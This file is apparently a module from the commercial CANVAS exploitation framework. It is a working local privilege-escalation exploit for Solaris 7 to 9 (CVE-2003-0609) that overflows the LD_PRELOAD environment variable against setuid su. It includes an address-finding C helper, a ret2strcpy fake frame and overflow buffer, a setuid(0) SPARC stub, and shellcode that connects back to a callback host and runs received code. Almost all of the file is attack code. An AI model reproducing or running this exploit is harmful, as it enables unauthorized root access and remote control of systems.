#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
sys.path.append(".")
sys.path.append("../../")

from exploitutils import *
from ExploitTypes.localexploit import LocalExploit

NAME="Solaris LD_PRELOAD debug edition"
DESCRIPTION="Local privilege escalation [ Solaris 7/8/9 (sun4u) ]"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Sun"
DOCUMENTATION["Notes"]="This is a classic local root elevation environment variable overflow for Solaris 7 though 9."
DOCUMENTATION["Date public"]="Jul 29, 2003"
DOCUMENTATION["CVE Name"] = "CVE-2003-0609"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0609"
DOCUMENTATION['CVSS'] = 7.2
DOCUMENTATION["References"]="http://sunsolve.sun.com/search/printfriendly.do?assetkey=1-26-55680-1"


VERSION="1.0"

PROPERTY={}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Local"
PROPERTY['ARCH'] = [ ["Solaris", "sparc"] ]
PROPERTY['VERSION'] = [ "5.7", "5.8", "5.9" ]

NOTES="""
I approached this exploit using Raptor's voodoo technique in mind, so the credit
for the actual approach goes to him (or whoever did ret2strcpy first ;)). 

If at any point you're wondering 'but this would be smaller..' most of the
more cumbersome C bits here are a result of MOSDEF C not being full completed
yet. You can expect most of the XXX issues to be addressed for your development
convenience ASAP.

Debugged on:

# uname -a
SunOS SUN 5.9 Generic_112233-07 sun4u sparc SUNW,Ultra-5_10
# ls -alrt /usr/bin/su
-r-sr-xr-x   1 root     sys        22292 Apr  6  2002 /usr/bin/su
# 

Right now the local is using static strcpy and rwx memory addies. I'm working
on a dlsym-like function to make it fully portable, but for now you'll have
to plug in these addies by hand for the box you want to dev on, some helper
code:

/* get helper addies for ret2strcpy
 * 31/08/2005
 *
 * gcc helper.c -o helper -ldl
 */

#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <dlfcn.h>
#include <link.h>
#include <procfs.h>
#include <fcntl.h>

int
get_strcpy(void)
{
  void *h;
  Link_map *linkmap;
  int a;

  h = dlmopen(LM_ID_LDSO, NULL, RTLD_LAZY);
  dlinfo(h, RTLD_DI_LINKMAP, &linkmap);
  a = (int)dlsym(h, "strcpy");
  dlclose(h);
  return a;
}

int
get_rwx(void)
{
  int fd;
  prmap_t map;
  int a;
  int last_a;
  char proc[32];

  a = 0;
  last_a = 0;
  
  sprintf(proc,"/proc/%d/map", getpid());
  fd = open(proc, O_RDONLY);
  // get last rwx mem before the stack (so that we dont have highword nul bytes)
  while (read(fd, &map, sizeof(map)))
  {
    if (map.pr_vaddr)
    {
      if (map.pr_mflags & (MA_READ | MA_WRITE | MA_EXEC))
      {
        last_a = a;
        a = map.pr_vaddr;
      }
    }
  }
  close(fd);
  // make sure low word is free of nul bytes, with 8 to prevent any align nonsense
  if (!(last_a & 0xff))
  {
    last_a |= 0x08;
  }
  if (!(last_a & 0xff00))
  {
    last_a |= 0x0800;
  }
  return last_a;
}
   
int
main(void)
{
  fprintf(stderr, "strcpy: 0x%X\n", get_strcpy());
  fprintf(stderr, "rwxmem: 0x%X\n", get_rwx());
  return 0;  
}

...

# gcc helper.c -o helper -ldl;./helper
strcpy: 0xFF3E2144
rwxmem: 0xFF3F8008
# 

"""


class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name = NAME
        self.shellcode = ""
        self.use_local_interface = False

    def createShellcode(self):
        from shellcode import shellcodeGenerator
        badstring = "\x00"
        sc = shellcodeGenerator.solarisSparc()
        sc.addAttr("connect",{"ipaddress": self.callback.ip, "port": self.callback.port})
        sc.addAttr("RecvExec",None)

        from MOSDEF import mosdef
        # note: because we're hosing the su proc (ret2strcpy, fake frame, ret2rwx) we need to set the fp
        # to make sense again
        fixstub = """
        and %sp,-8,%sp
        add %sp,96,%fp
        ! setuid 0
        mov %g0,%o0
        mov 23,%g1
        ta 8
        """
        rawshellcode = mosdef.assemble(fixstub, "SPARC") + sc.get()

        from encoder import addencoder
        encoder = addencoder.sparcaddencoder()
        #these are the characters not allowed by the exploit
        encoder.setbadstring(badstring)
        shellcode = encoder.encode(rawshellcode)
        if shellcode == "":
            self.log("Could not encode shellcode")
            return 0
        self.shellcode = shellcode
        return self.shellcode

    def neededListenerTypes(self): 
        from canvasengine import SOLARISSPARCMOSDEF
        return [SOLARISSPARCMOSDEF]

    def run(self):
        import time
        self.setInfo("%s (in progress)"%(NAME))

        for node in self.argsDict["passednodes"]:            
            type = node.nodetype

        # EXPLOIT CODE EXPLOIT CODE EXPLOIT CODE EXPLOIT CODE EXPLOIT CODE

        vars = {}
        vars["TARGET"] = "/usr/bin/su"
        #vars["SHELLCODE"] = mosdef.assemble("ta 1", "SPARC"); 
        vars["SHELLCODE"] = self.shellcode 
        vars["SI_PLATFORM"] = 513
        vars["SI_RELEASE"] = 3
        vars["ALIGN"] = 3

        code = """
        #import "local", "debug" as "debug"
        // from our in-house libc functions (see ./MOSDEF/solarisremoteresolver.py)
        #import "local", "execve" as "execve"
        #import "local", "sendint" as "sendint"
        #import "local", "getpid" as "getpid"
        #import "local", "fork" as "fork"
        #import "local", "write" as "write"
        #import "local", "sysinfo" as "sysinfo"
        #import "local", "memset" as "memset"
        #import "local", "strlen" as "strlen"

        // variables imported from the vars dict
        #import "string", "TARGET" as "TARGET"
        #import "string", "SHELLCODE" as "SHELLCODE"
        #import "int", "SI_PLATFORM" as "SI_PLATFORM"
        #import "int", "SI_RELEASE" as "SI_RELEASE"
        #import "int", "ALIGN" as "ALIGN"

// XXX: f(void) == f()

        int 
        getstrcpy()
        {
// debugging target, will do a proper dlsym routine ASAP
// SunOS SUN 5.9 Generic_112233-07 sun4u sparc SUNW,Ultra-5_10
          return 0xFF3E2144;
        }

        int
        getrwx()
        {
// debugging target, will do a proper rwx routine ASAP
// SunOS SUN 5.9 Generic_112233-07 sun4u sparc SUNW,Ultra-5_10
          return 0xFF3F8008;
        }

        int
        oldvoodoo(int off, int a, int b)
        {
          int ma;
          int mb;
          int i;
          int off_c;

          off_c = off;

// XXX: big fix needed! in0 args can't be used on l-side operations!
// ValueError: invalid literal for int(): in0

          off_c = off_c - 1;
          ma = a + b;
          ma = ma - 1;
          while (ma > 4)
          {
            ma = ma - 4;
          }
          mb = off_c;
          while(mb > 4)
          {
            mb = mb - 4;
          }
          i = ma - mb;
          if (i < 0)
          {
            i = 8 - mb;
            off_c = off_c + i;
          }
          else
          {
            i = 4 - mb;
            off_c = off_c + i;
          }

          return off_c;
        }

        int
        newvoodoo(int off, int a, int b)
        {
          int i;
          int ma;
          int off_c;

          off_c = off;

          ma = a + b + 1;
          ma = ma * 4;
          ma = ma + off_c;
          ma = ma + 3;
          
          while(ma > 8)
          {
            ma = ma - 8;
          }
          i = 7 - ma;
          off_c = off_c + i;

          return off_c;
        }
          
        void
        put_long(char *p, int i, int what)
        {
          int t;
          char *pc;
          char a;
          char b;
          char c;
          char d;

// XXX: dont ask ;)

          t = what & 0xff000000;
          a = t >> 24;
          t = what & 0xff0000;
          b = t >> 16;
          t = what & 0xff00;
          c = t >> 8;
          d = what & 0xff;

          pc = p + i;

         *pc = a;
          pc = pc + 1;
         *pc = b;
          pc = pc + 1; 
         *pc = c;
          pc = pc + 1;  
         *pc = d;

         return;
        }

        int 
        put_env(char *str, char **env, int *env_pos, int *env_len)
        {
          int i;
          int m;
          int a;
          int b;
          int c;

          if (str == 0)
          {
            env[*env_pos] = 0;
            return *env_len;
          }

          env[*env_pos] = str;

// XXX: need proper l-side pointer dereference, right now we seem to mess up on any > 1 l-side operand on *p deref

          a = strlen(str);
          a = a + 1;
          b = *env_len;
          *env_len = a + b;

          a = *env_pos;
          b = 1;
          *env_pos = a + b;
          
          i = strlen(str);
          i = i + 1;
          m = 0;

// XXX: i need to do proper modulus support for sparc 

          while (i > 4)
          {
            i = i - 4;
          }
          if (i != 0)
          {
            m = 4 - i;
          }
          while(m != 0)
          {

// XXX: oi vey :>

            c = strlen(str);
            c = c + str;
            i = *env_pos;
            env[i] = c;
            a = *env_len;
            b = 1; 
            *env_len = a + b;
            a = *env_pos;
            b = 1;
            *env_pos = a + b;
            m = m - 1;
          }

          return *env_len;
        }
            
        void 
        main()
        {
          char buf[1700];
          char frame[68];
          char platform[256];
          int ppid;
          int pid;
          int plen;
          int nlen;
          int off;
          int release;
          int stackbase;
          int frame_addr;
          int shellcode_addr;
          int string_addr;
          int strcpy_addr;
          int rwx_addr;

          char *env[256];
          int env_pos;
          int env_len;
          char *arg[2];
          int arg_len;
          int arg_pos;

          int i;
         
          // determine stack base
          stackbase = &stackbase | 0x0000ffff;
          stackbase = stackbase & 0xfffffffc;

          // get sysinfo          
          sysinfo(SI_PLATFORM, platform, 255);
          sysinfo(SI_RELEASE, &release, 4);

// XXX: need proper casting + fix align related bus error
// XXX: on char array[3] style stuff, we need to ld from a aligned addie
// XXX: and shift the right value out

          // little hack to prevent having to do an atoi ;) '0' == 0x30
          release = release & 0x0000ff00;
          release = release >> 8;
          release = release - 0x30;

          // 5.10 > not vuln
          if (release == 1)
          {
            sendint(0);
          }

          arg[0] = "abc";
          arg[1] = 0;

          arg_len = 4;
          arg_pos = 1;
          env_len = 0;
          env_pos = 0;

          // REMEMBER TO DO THESE!
          strcpy_addr = getstrcpy();
          rwx_addr = getrwx();

          // start building the buf 
          memset(buf, 0x41, 1700);

// XXX: fix the align issue so we can do a proper dst,src memcpy

          // LD_PRELOAD=/
          buf[0] = 0x4c;
          buf[1] = 0x44;
          buf[2] = 0x5f;
          buf[3] = 0x50;
          buf[4] = 0x52;
          buf[5] = 0x45;
          buf[6] = 0x4c;
          buf[7] = 0x4f;
          buf[8] = 0x41;
          buf[9] = 0x44;
          buf[10] = 0x3d;
          buf[11] = 0x2f;
          // terminate
          buf[1698] = 0x2f;
          buf[1699] = 0x00;

          // prepare the strcpy frame
          i = 0;
          memset(frame, 0x00, 68);
          // saved l regs
          put_long(frame, i, 0xcafebabe); i = i + 4;           
          put_long(frame, i, 0xcafebabe); i = i + 4;           
          put_long(frame, i, 0xcafebabe); i = i + 4;           
          put_long(frame, i, 0xcafebabe); i = i + 4;           
          put_long(frame, i, 0xcafebabe); i = i + 4;           
          put_long(frame, i, 0xcafebabe); i = i + 4;           
          put_long(frame, i, 0xcafebabe); i = i + 4;           
          put_long(frame, i, 0xcafebabe); i = i + 4;           
          // saved i regs
          put_long(frame, i, rwx_addr); i = i + 4; // 1st arg to strcpy (rwx)           
          put_long(frame, i, 0x41424344); i = i + 4; // 2nd arg to strcpy (shellcode)         
          put_long(frame, i, 0xcafebabe); i = i + 4;           
          put_long(frame, i, 0xcafebabe); i = i + 4;           
          put_long(frame, i, 0xcafebabe); i = i + 4;           
          put_long(frame, i, 0xcafebabe); i = i + 4;           
          put_long(frame, i, stackbase - 1000 ); i = i + 4; // fp
          put_long(frame, i, rwx_addr - 8); i = i + 4; // return address (rwx-8)          

          // build the initial env
          shellcode_addr = put_env(frame, env, &env_pos, &env_len);
          string_addr = put_env(SHELLCODE, env, &env_pos, &env_len);
          put_env("efg", env, &env_pos, &env_len);
          put_env(buf, env, &env_pos, &env_len);
          put_env(0, env, &env_pos, &env_len);

          // do the offset Marco style voodoo
          plen = strlen(platform); plen = plen + 1;
          nlen = strlen(TARGET); nlen = nlen + 1;
          off = arg_len + env_len + plen + nlen;

          if (release > 7)
          {
            off = newvoodoo(off, arg_pos, env_pos);
          }
          else
          {
            off = oldvoodoo(off, plen, nlen);
          }

          // get the final addies
          frame_addr = stackbase - off; 
          frame_addr = frame_addr + arg_len;
          shellcode_addr = shellcode_addr + frame_addr;
          string_addr = string_addr + frame_addr;

          // set the i1 (2nd strcpy arg)
          put_long(frame, 36, shellcode_addr);

          // fill buf with survival ptr to "efg" string (align is 3)
          i = 12 + ALIGN;
          while (i < 1296)
          {
            put_long(buf, i, string_addr); i = i + 4;
          }
          i = 1296 + ALIGN;
          while (i < 1688)
          {
            put_long(buf, i, frame_addr); i = i + 4;
            put_long(buf, i, strcpy_addr - 4); i = i + 4;
          }
         
          // fork and exec with evil LD_PRELOAD env
          ppid = getpid();
          pid = fork();  
          if (pid == ppid)
          {
            execve(TARGET, arg, env);
          }

          // return
          sendint(env_len);
        }
        """

        # EXPLOIT CODE EXPLOIT CODE EXPLOIT CODE EXPLOIT CODE EXPLOIT CODE
        result = 0
        try:
            result = node.shell.runCode(code, vars)
        except:
            print "[!] did you try and run me on localNode you naughty boy?"
 
        if result:
            self.log("[!] Executed target with evil LD_PRELOAD, snoozing for connectback node")
        else:
            self.log("[!] Failed...")
            return 0

        time.sleep(5)

        ret = self.ISucceeded()
        if ret:
            self.setInfo("%s - done (success)"%(NAME))
        else:
            self.setInfo("%s - done (failed)"%(NAME))
        return ret

    

